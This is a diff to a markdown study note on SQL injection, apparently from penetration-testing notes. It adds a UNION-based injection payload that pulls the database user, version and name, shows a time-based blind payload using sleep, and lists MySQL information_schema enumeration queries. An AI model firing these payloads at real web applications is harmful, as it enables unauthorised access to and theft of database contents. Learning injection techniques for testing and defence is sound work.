@@ -28,17 +28,16 @@ This often happens when the underlying database runs a query like
 SELECT * WHERE UserInfo LIKE $userInput
 ```
 and the result is simply shown on the corresponding website.
+Start by enumerating the number of collumns in the table.
+Once that is done, you will be able to get a number of columns where you can see the output 
 
-Start by enumerating the number of collumns in the table:
 
 then, we can do futher enumeration like:
 
 ```
-' UNION SELECT null,  user(), @@version, database()  -- //
+' UNION SELECT null, user(), @@version, database(), null, null  -- //
 ```
-To get the user we are running under, the version of the database and the database name.
-(note the `null` column is queried first as the first column is usually the ID column of the table).
-
+or enumeration queries as seen in the bottom of this note document.
 
 ## Blind SQLi
 
@@ -57,3 +56,14 @@ Similarly, for time-based SQLi, we can do something like:
 admin' AND IF (1=1, sleep(4),'false') 
 ```
 which will return after 4 seconds when `admin` exists.
+
+
+## Good enumeration queries for MySQL
+
+```
+SELECT table_name FROM information_schema.tables
+```
+equivalent to `SHOW DATABASES`:
+```
+SELECT schema_name 
+FROM information_schema.schemata;
